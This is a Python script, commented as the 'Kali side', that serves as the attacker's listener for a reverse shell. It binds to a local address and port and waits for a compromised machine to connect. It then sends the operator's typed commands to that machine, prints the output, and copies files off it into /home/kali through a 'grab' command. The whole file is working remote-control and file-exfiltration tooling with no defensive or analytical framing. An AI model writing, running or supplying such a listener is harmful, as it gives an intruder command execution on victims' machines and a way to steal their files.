import socket

#Kali side
#open a port and received inbound, create listener

#Function to transfert file
def transfer(conn,command):
	
	#create file
	grab, filenamee = command.split('*')
	f=open('/home/kali/'+filenamee, 'wb')
	#lauch grab*file command
	conn.send(command.encode())
	while True:
		#bits =conn.recv(1024
		bits =conn.recv(1024)
		print ('[1] Transfer in progress')
		#check if file done
		if bits.endswith('DONE'.encode()):
			f.write(bits[:-4]) #remove DONE it from file
			f.close()
			print ('[1] Transfer completed')
			break
		if 'no file exists'.encode() in bits:
			print ('[2] Unable to found the file')
			break
		f.write(bits) #keep writing until we don't see Done

def connect():
    s = socket.socket()
    #listen here
    s.bind(("192.168.0.139",8080))
    #backlogsize one session, maxime connexion
    s.listen(1)
    #accepted inbound connexion, return object con and targer address
    con , addr = s.accept()
    print ('[1] connexion from', addr)

    #infinite loop to get our input cmd and send to target
    while True:
        command = input("Shell> ")

        #if we want to terminate the session 
        if 'terminate' in command:
            con.send('terminate'.encode()) #send cmd in bytes
            con.close() #close socket in our side
            break #quit the loop
        elif 'grab' in command:
            transfer(con, command)
        else:
			#SEND
            con.send(command.encode()) #send the input cmd
            #print (con.recv(1024).decode('unicode_escape').encode('utf-8')) 
            #print (con.recv(4096).decode('unicode_escape').encode('utf-8')) 
			#get 1 kilobyte of received data
			#WAIT for answer
            print (con.recv(1024).decode('iso8859-1')) 
			
def main():
    connect()

main()

